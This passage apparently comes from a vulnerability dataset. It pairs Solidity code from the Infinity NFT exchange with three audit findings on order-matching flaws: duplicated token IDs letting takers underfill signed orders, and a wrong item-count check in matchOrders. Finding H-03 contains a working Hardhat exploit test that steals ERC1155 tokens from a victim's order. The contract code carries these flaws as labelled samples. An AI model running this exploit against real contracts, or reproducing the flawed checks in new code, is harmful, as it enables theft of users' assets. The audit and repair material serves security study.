(uint256 i = 0; i < numNfts; ) {\n      bytes32 hash = keccak256(abi.encode(ORDER_ITEM_HASH, nfts[i].collection, _tokensHash(nfts[i].tokens)));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 nftsHash = keccak256(abi.encodePacked(hashes));\n    return nftsHash;\n  }\n\n  function _tokensHash(OrderTypes.TokenInfo[] calldata tokens) internal pure returns (bytes32) {\n    // keccak256('TokenInfo(uint256 tokenId,uint256 numTokens)')\n    bytes32 TOKEN_INFO_HASH = 0x88f0bd19d14f8b5d22c0605a15d9fffc285ebc8c86fb21139456d305982906f1;\n    uint256 numTokens = tokens.length;\n    bytes32[] memory hashes = new bytes32[](numTokens);\n    for (uint256 i = 0; i < numTokens; ) {\n      bytes32 hash = keccak256(abi.encode(TOKEN_INFO_HASH, tokens[i].tokenId, tokens[i].numTokens));\n      hashes[i] = hash;\n      unchecked {\n        ++i;\n      }\n    }\n    bytes32 tokensHash = keccak256(abi.encodePacked(hashes));\n    return tokensHash;\n  }\n\n  // ====================================================== ADMIN FUNCTIONS ======================================================\n\n  /// @dev used for rescuing exchange fees paid to the contract in tokens\n  function rescueTokens(\n    address destination,\n    address currency,\n    uint256 amount\n  ) external onlyOwner {\n    IERC20(currency).safeTransfer(destination, amount);\n  }\n\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n\n  /// @dev adds a new transaction currency to the exchange\n  function addCurrency(address _currency) external onlyOwner {\n    _currencies.add(_currency);\n  }\n\n  /// @dev adds a new complication to the exchange\n  function addComplication(address _complication) external onlyOwner {\n    _complications.add(_complication);\n  }\n\n  /// @dev removes a transaction currency from the exchange\n  function removeCurrency(address _currency) external onlyOwner {\n    _currencies.remove(_currency);\n  }\n\n  /// @dev removes a complication from the exchange\n  function removeComplication(address _complication) external onlyOwner {\n    _complications.remove(_complication);\n  }\n\n  /// @dev updates auto snipe executor\n  function updateMatchExecutor(address _matchExecutor) external onlyOwner {\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  /// @dev updates the gas units required for WETH transfers\n  function updateWethTranferGas(uint32 _wethTransferGasUnits) external onlyOwner {\n    WETH_TRANSFER_GAS_UNITS = _wethTransferGasUnits;\n    emit NewWethTransferGasUnits(_wethTransferGasUnits);\n  }\n\n  /// @dev updates exchange fees\n  function setProtocolFee(uint16 _protocolFeeBps) external onlyOwner {\n    PROTOCOL_FEE_BPS = _protocolFeeBps;\n    emit NewProtocolFee(_protocolFeeBps);\n  }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';\n\ncontract MockERC20 is ERC20 {\n  constructor() ERC20('MockERC20', 'MCK20') {\n    uint256 supply = 1_000_000 * (10**decimals());\n    _mint(msg.sender, supply);\n  }\n}\n\n\n",
        "CodeNames": [
            "InfinityOrderBookComplication.sol",
            "InfinityExchange.sol",
            "MockERC20.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "doTokenIdsIntersect()",
                    "tokenId",
                    "buy order",
                    "order",
                    "matchOneToManyOrders()",
                    "and",
                    "areTakerNumItemsValid()",
                    "matchOrders()",
                    "_takeOrders()",
                    "canExecTakeOrder()",
                    "NFT",
                    "takeOrders()",
                    "sell order",
                    "ERC"
                ],
                "Type": " Loss of funds in  matchOneToManyOrders()  and  takeOrders()  and  matchOrders()  because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in  doTokenIdsIntersect()  especially for ERC1155 tokens)",
                "Description": "\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243\n\n\nFunction matchOneToManyOrders() and takeOrders() and matchOrders() suppose to match sell order to buy order and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an order has different NFT token ids in each one of it's collections, so even so number of tokens could be valid in order to order transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of ERC1155 there can be more than one token for a tokenId, so it would be possible to transfer it)\n\n\nThis is _takeOrders() and and code:\n\n      /\n       * @notice Internal helper function to take orders\n       * @dev verifies whether order can be executed\n       * @param makerOrder the maker order\n       * @param takerItems nfts to be transferred\n       * @param execPrice execution price\n       */\n      function _takeOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.OrderItem[] calldata takerItems,\n        uint256 execPrice\n      ) internal {\n        bytes32 makerOrderHash = _hash(makerOrder);\n        bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n        bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n        require(makerOrderValid && executionValid, 'order not verified');\n        _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n      }\n\nAs you can see it uses canExecTakeOrder() to check that it is valid to perform matching. This is canExecTakeOrder() and areTakerNumItemsValid() and doTokenIdsIntersect() code which are used in execution flow to check orders and matching validity:\n\n      /\n       * @notice Checks whether take orders with a higher order intent can be executed\n       * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n              It checks whether orders have the right constraints i.e they have the right number of items, whether time is still valid\n              and whether the nfts intersect\n       * @param makerOrder the maker order\n       * @param takerItems the taker items specified by the taker\n       * @return returns whether order can be executed\n       */\n      function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        external\n        view\n        override\n        returns (bool)\n      {\n        return (makerOrder.constraints[3] <= block.timestamp &&\n          makerOrder.constraints[4] = block.timestamp &&\n          areTakerNumItemsValid(makerOrder, takerItems) &&\n          doItemsIntersect(makerOrder.nfts, takerItems));\n      }\n\n      /// @dev sanity check to make sure that a taker is specifying the right number of items\n      function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 numTakerItems = 0;\n        uint256 nftsLength = takerItems.length;\n        for (uint256 i = 0; i < nftsLength; ) {\n          unchecked {\n            numTakerItems += takerItems[i].tokens.length;\n            ++i;\n          }\n        }\n        return makerOrder.constraints[0] == numTakerItems;\n      }\n\n      /\n       * @notice Checks whether tokenIds intersect\n       * @dev This function checks whether there are intersecting tokenIds between two order items\n       * @param item1 first item\n       * @param item2 second item\n       * @return returns whether tokenIds intersect\n       */\n      function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 item1TokensLength = item1.tokens.length;\n        uint256 item2TokensLength = item2.tokens.length;\n        // case where maker/taker didn't specify any tokenIds for this collection\n        if (item1TokensLength == 0 || item2TokensLength == 0) {\n          return true;\n        }\n        uint256 numTokenIdsPerCollMatched = 0;\n        for (uint256 k = 0; k < item2TokensLength; ) {\n          for (uint256 l = 0; l < item1TokensLength; ) {\n            if (\n              item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n            ) {\n              // increment numTokenIdsPerCollMatched\n              unchecked {\n                ++numTokenIdsPerCollMatched;\n              }\n              // short circuit\n              break;\n            }\n            unchecked {\n              ++l;\n            }\n          }\n          unchecked {\n            ++k;\n          }\n        }\n\n        return numTokenIdsPerCollMatched == item2TokensLength;\n      }\n\nAs you can see there is no logic to check that token IDs in one collection of order are different and code only checks that total number of tokens in one order matches the number of tokens specified and the ids in one order exists in other list defined. function doTokenIdsIntersect() checks to see that tokens ids in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for ERC1155 tokens (normal ERC721 requires more strange conditions). here is first example:\n\n1.  For simplicity, let's assume collection and timestamp are valid and match for orders and token is ERC1155\n2.  user1 has signed this order: A:(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH) (buy 1 token of each id=1,2,3)\n3.  NFT ID[1] fair price is 1 ETH, NFT ID[2] fair price is 2 ETH, NFT ID[3] fair price is 12 ETH\n4.  attacker who has 3 of NFT ID[1] create this list: B:(NFT IDs[(1,1), (1,1), (1,1)] ) (list to trade 1token of id=1 for 3 times)\n5.  Attacker call takeOrders() with this parameters: makerOrder: A , takerNfts: B\n6.  Contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction.\n7.  attacker would receive 15 ETH for his 3 token of NFT ID[1] and steal user1 funds. user1 would receive 3 of NFT ID[1] and pays 15 ETH and even so his order A has been executed he doesn't receive NFT IDs[(2,1),(3,1)] and contract would violates his signed parameters.\n\nThis examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function doTokenIdsIntersect() doesn't check for this).\n\nThis scenario is performable to matchOneToManyOrders() and matchOrders() and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call takeOrders() if NFT tokens are ERC1155. for other NFT tokens to perform this attack it requires that seller==buyer or some other strange cases (like auto selling when receiving in one contract).\n\n\nVIM\n\n",
                "Repair": "\nAdd checks to ensure order's one collection's token ids are not duplicate in doTokenIdsIntersect()\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1162878540):\n  Agree with assessment. Fixed. https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8 and removed support for ERC1155\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1179823515):\n  This is an interesting scenario where the same NFT appears multiple times in a match and results in one order being under filled, leading to potential losses for the user. And the attack does not depend on the matching engine. Agree this is High risk.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-03",
                "Location": [
                    "\n[\n    {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n    },\n    {\n          collection: mock1155Contract2.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n    }\n];\n\n",
                    "//solidity\n// SPDX-License-Identifier: MIT\npragma //solidity 0.8.14;\nimport {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';\nimport {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract MockERC1155 is ERC1155URIStorage, Ownable {\n  uint256 numMints;\n\n  constructor(string memory uri) ERC1155(uri) {}\n\n  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {\n    super._mint(to, id, amount, data);\n  }\n}\n",
                    "js\nconst { expect } = require('chai');\nconst { ethers, network } = require('hardhat');\nconst { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');\nconst {\n  getCurrentSignedOrderPrice,\n  approveERC20,\n  grantApprovals,\n  signOBOrder\n} = require('../helpers/orders');\n\nasync function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {\n  // grant approvals\n  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);\n  if (!approvals) {\n    return undefined;\n  }\n\n  // sign order\n  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);\n\n  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);\n  if (!isSigValid) {\n    console.error('Signature is invalid');\n    return undefined;\n  }\n  return signedOBOrder;\n}\n\ndescribe('PoC', function () {\n  let signers,\n    dev,\n    matchExecutor,\n    victim,\n    hacker,\n    token,\n    infinityExchange,\n    mock1155Contract1,\n    mock1155Contract2,\n    obComplication\n\n  const sellOrders = ];\n\n  let orderNonce = 0;\n\n  const UNIT = toBN(1e18);\n  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);\n\n  const totalNFTSupply = 100;\n  const numNFTsToTransfer = 50;\n  const numNFTsLeft = totalNFTSupply numNFTsToTransfer;\n\n  function toBN(val) {\n    return ethers.BigNumber.from(val.toString());\n  }\n\n  before(async () = {\n    // signers\n    signers = await ethers.getSigners();\n    dev = signers[0];\n    matchExecutor = signers[1];\n    victim = signers[2];\n    hacker = signers[3];\n    // token\n    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);\n\n    // NFT constracts (ERC1155)\n    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, \n      'uri1'\n    ]);\n    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, \n      'uri2'\n    ]);\n\n    // Exchange\n    infinityExchange = await deployContract(\n      'InfinityExchange',\n      await ethers.getContractFactory('InfinityExchange'),\n      dev,\n      token.address, matchExecutor.address]\n    );\n\n    // OB complication\n    obComplication = await deployContract(\n      'InfinityOrderBookComplication',\n      await ethers.getContractFactory('InfinityOrderBookComplication'),\n      dev\n    );\n\n    // add currencies to registry\n    await infinityExchange.addCurrency(token.address);\n    await infinityExchange.addCurrency(NULL_ADDRESS);\n\n    // add complications to registry\n    await infinityExchange.addComplication(obComplication.address);\n\n    // send assets\n    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());\n    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());\n    for (let i = 0; i < numNFTsToTransfer; i++) {\n      await mock1155Contract1.mint(victim.address, i, 50, '0x');\n      await mock1155Contract2.mint(victim.address, i, 50, '0x');\n    }\n  });\n\n  describe('StealERC1155ByDuplicateItems', () = {\n    it('Passed test denotes successful hack', async function () {\n      // prepare order\n      const user = {\n        address: victim.address\n      };\n      const chainId = network.config.chainId ?? 31337;\n      const nfts = \n        {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract2.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        }\n      ];\n      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };\n      const extraParams = {};\n      const nonce = ++orderNonce;\n      const orderId = ethers.utils.//solidityKeccak256(['address', 'uint256', 'uint256'], user.address, nonce, chainId]);\n      let numItems = 0;\n      for (const nft of nfts) {\n        numItems += nft.tokens.length;\n      }\n      const order = {\n        id: orderId,\n        chainId,\n        isSellOrder: true,\n        signerAddress: user.address,\n        numItems,\n        startPrice: ethers.utils.parseEther('1'),\n        endPrice: ethers.utils.parseEther('1'),\n        startTime: nowSeconds(),\n        endTime: nowSeconds().add(10 * 60),\n        nonce,\n        nfts,\n        execParams,\n        extraParams\n      };\n      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);\n      expect(sellOrder).to.not.be.undefined;\n\n      // form matching nfts\n      const nfts_ = \n        {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        }\n      ];\n\n      // approve currency\n      let salePrice = getCurrentSignedOrderPrice(sellOrder);\n      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);\n\n      // perform exchange\n      await infinityExchange.connect(hacker).takeOrders([sellOrder], nfts_]);\n\n      // owners after sale\n      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1\n      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss\n      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);\n    });\n  });\n});\n",
                    "bash\n$ npx hardhat test --grep PoC\n\n  PoC\n    StealERC1155ByDuplicateItems\n      \u2713 Passed test denotes successful hack\n"
                ],
                "Type": "  canExecTakeOrder  mismatches  makerOrder  and  takerItems  when duplicated items present",
                "Description": "\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243\n\n\nWhen any user provides a sellOrder and they are trying to sell multiple tokens from *n* (n  1) different ERC1155 collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.\n\nIn short, hackers can violate the user-defined orders.\n\n\nThe logic of canExecTakeOrder and canExecMatchOneToMany is not correct.\n\nLet's take  canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)   as an example, while canExecMatchOneToMany shares the same error.\n\nSpecifically, it first checks whether the number of selling item in makerOrder matches with the ones in takerItems. Note that the number is an aggregated one. Then, it check whether all the items in takerItems are within the scope defined by makerOrder.\n\nThe problem comes when there are duplicated items in takerItems. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means takerItems exactly matches all items in makerOrder, which means violation of the order.\n\nFor example, if the order requires\n\n\n\n    {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n    },\n    {\n          collection: mock1155Contract2.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n    }\n];\n\n\n\nand the taker provides\n\n    \n        {\n              collection: mock1155Contract1.address,\n              tokens: { tokenId: 0, numTokens: 1 }]\n        },\n        {\n              collection: mock1155Contract1.address,\n              tokens: { tokenId: 0, numTokens: 1 }]\n        }\n    ];\n\nThe taker can grabs two mock1155Contract1 tokens by paying the order which tries to sell a mock1155Contract1 token and a mock1155Contract2 token. When mock1155Contract1 is much more expensive, the victim user will suffer from a huge loss.\n\nAs for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells mock1155Contract1 tokens. The attack is easy to perform.\n\n\nFirst put the MockERC1155.sol under the contracts/ directory:\n\nsolidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';\nimport {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract MockERC1155 is ERC1155URIStorage, Ownable {\n  uint256 numMints;\n\n  constructor(string memory uri) ERC1155(uri) {}\n\n  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {\n    super._mint(to, id, amount, data);\n  }\n}\n\n\nAnd then put poc.js under the test/ directory.\n\njs\nconst { expect } = require('chai');\nconst { ethers, network } = require('hardhat');\nconst { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');\nconst {\n  getCurrentSignedOrderPrice,\n  approveERC20,\n  grantApprovals,\n  signOBOrder\n} = require('../helpers/orders');\n\nasync function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {\n  // grant approvals\n  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);\n  if (!approvals) {\n    return undefined;\n  }\n\n  // sign order\n  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);\n\n  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);\n  if (!isSigValid) {\n    console.error('Signature is invalid');\n    return undefined;\n  }\n  return signedOBOrder;\n}\n\ndescribe('PoC', function () {\n  let signers,\n    dev,\n    matchExecutor,\n    victim,\n    hacker,\n    token,\n    infinityExchange,\n    mock1155Contract1,\n    mock1155Contract2,\n    obComplication\n\n  const sellOrders = ];\n\n  let orderNonce = 0;\n\n  const UNIT = toBN(1e18);\n  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);\n\n  const totalNFTSupply = 100;\n  const numNFTsToTransfer = 50;\n  const numNFTsLeft = totalNFTSupply numNFTsToTransfer;\n\n  function toBN(val) {\n    return ethers.BigNumber.from(val.toString());\n  }\n\n  before(async () = {\n    // signers\n    signers = await ethers.getSigners();\n    dev = signers[0];\n    matchExecutor = signers[1];\n    victim = signers[2];\n    hacker = signers[3];\n    // token\n    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);\n\n    // NFT constracts (ERC1155)\n    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, \n      'uri1'\n    ]);\n    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, \n      'uri2'\n    ]);\n\n    // Exchange\n    infinityExchange = await deployContract(\n      'InfinityExchange',\n      await ethers.getContractFactory('InfinityExchange'),\n      dev,\n      token.address, matchExecutor.address]\n    );\n\n    // OB complication\n    obComplication = await deployContract(\n      'InfinityOrderBookComplication',\n      await ethers.getContractFactory('InfinityOrderBookComplication'),\n      dev\n    );\n\n    // add currencies to registry\n    await infinityExchange.addCurrency(token.address);\n    await infinityExchange.addCurrency(NULL_ADDRESS);\n\n    // add complications to registry\n    await infinityExchange.addComplication(obComplication.address);\n\n    // send assets\n    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());\n    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());\n    for (let i = 0; i < numNFTsToTransfer; i++) {\n      await mock1155Contract1.mint(victim.address, i, 50, '0x');\n      await mock1155Contract2.mint(victim.address, i, 50, '0x');\n    }\n  });\n\n  describe('StealERC1155ByDuplicateItems', () = {\n    it('Passed test denotes successful hack', async function () {\n      // prepare order\n      const user = {\n        address: victim.address\n      };\n      const chainId = network.config.chainId ?? 31337;\n      const nfts = \n        {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract2.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        }\n      ];\n      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };\n      const extraParams = {};\n      const nonce = ++orderNonce;\n      const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], user.address, nonce, chainId]);\n      let numItems = 0;\n      for (const nft of nfts) {\n        numItems += nft.tokens.length;\n      }\n      const order = {\n        id: orderId,\n        chainId,\n        isSellOrder: true,\n        signerAddress: user.address,\n        numItems,\n        startPrice: ethers.utils.parseEther('1'),\n        endPrice: ethers.utils.parseEther('1'),\n        startTime: nowSeconds(),\n        endTime: nowSeconds().add(10 * 60),\n        nonce,\n        nfts,\n        execParams,\n        extraParams\n      };\n      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);\n      expect(sellOrder).to.not.be.undefined;\n\n      // form matching nfts\n      const nfts_ = \n        {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract1.address,\n          tokens: { tokenId: 0, numTokens: 1 }]\n        }\n      ];\n\n      // approve currency\n      let salePrice = getCurrentSignedOrderPrice(sellOrder);\n      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);\n\n      // perform exchange\n      await infinityExchange.connect(hacker).takeOrders([sellOrder], nfts_]);\n\n      // owners after sale\n      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1\n      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss\n      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);\n    });\n  });\n});\n\n\nAnd run\n\nbash\n$ npx hardhat test --grep PoC\n\n  PoC\n    StealERC1155ByDuplicateItems\n      \u2713 Passed test denotes successful hack\n\n\nNote that the passed test denotes a successful hack.\n\n",
                "Repair": "\nI would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.\n\n\nnneverlander (Infinity) confirmed and resolved(https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1162897771):\n  Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1179560900):\n This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker's advantage when the NFTs are not valued the same.\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-10",
                "Location": [
                    "construct",
                    "areNumItemsValid()",
                    "matchOrders",
                    "matchOrders()"
                ],
                "Type": " Sellers may lose NFTs when orders are matched with  matchOrders() ",
                "Description": "\nFunction matchOrders uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.\n\nBut in function(https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) areNumItemsValid(), there is a wrong checking will lead to wrong logic in matchOrders() function.\n\nInstead of checking if numConstructedItems <= sell.constraints[0] or not, function areNumItemsValid() check if buy.constraints[0] <= sell.constraints[0]. It will lead to the scenario that numConstructedItems  sell.constraints[0] and make the seller sell more number of nfts than he/she allow.\n\n\nConsider the scenario\n\n1.  Alice create a sell order to sell maximum 2 in her 3 BAYC with ids [1, 2, 3]\n2.  Bob create a buy order to buy mimimum any 2 BAYC with id in list [1, 2, 3]\n3.  Match executor call matchOrders() to match Alice's order and Bob's one with parameter constructs = 1, 2, 3]\n4.  Function matchOrders will transfer all NFT in construct list (3 NFTs 1, 2, 3) from seller to buyer even though seller only want to sell maximum 2 NFTs.\n\nFor more information, please check this PoC.\n<https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878\n\n\nHardhat, Chai\n\n",
                "Repair": "\nReplace check buy.constraints[0] <= sell.constraints[0] with numConstructedItems <= sell.constraints[0]\n\nnneverlander (Infinity) confirmed(https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1163505913)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-06-infinity-findings/issues/164#issuecomment-1179746706):\n  Seller's may specify a max number of NFTs to sell, but in the scenario outlined by the warden that requirement is not enforced leading to the sale of more NFTs than authorized.\n \n Accepting this as a High risk report.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\n\n// external imports\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\nimport {ReentrancyGuard} from '@openzeppelin/contracts/security/ReentrancyGuard.sol';\nimport {IERC165} from '@openzeppelin/contracts/interfaces/IERC165.sol';\nimport {IERC721} from '@openzeppelin/contracts/token/ERC721/IERC721.sol';\nimport {IERC1155} from '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';\nimport {IERC20, SafeERC20} from '@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol';\nimport {EnumerableSet} from '@openzeppelin/contracts/utils/structs/EnumerableSet.sol';\n\n// internal imports\nimport {OrderTypes} from '../libs/OrderTypes.sol';\nimport {IComplication} from '../interfaces/IComplication.sol';\nimport {SignatureChecker} from '../libs/SignatureChecker.sol';\n\n/**\n@title InfinityExchange\n@author nneverlander. Twitter @nneverlander\n@notice The main NFT exchange contract that holds state and does asset transfers\n@dev This contract can be extended via 'complications' - strategies that let the exchange execute various types of orders\n      like dutch auctions, reverse dutch auctions, floor price orders, private sales, etc.\n\nNFTNFTNFT...........................................NFTNFTNFT\nNFTNFT                                                 NFTNFT\nNFT                                                       NFT\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.           NFTNFTNFTNFTNFTNFT   NFTNFTNFTNFTNFTNFT         .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.         NFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFTNFT        .\n.          NFTNFTNFTNFTNFTNFTN   NFTNFTNFTNFTNFTNFT         .\n.            NFTNFTNFTNFTNFT      NFTNFTNFTNFTNFT           .\n.               NFTNFTNFT            NFTNFTNFT              .\n.                                                           .\n.                                                           .\n.                                                           .\n.                                                           .\nNFT                                                       NFT\nNFTNFT                                                 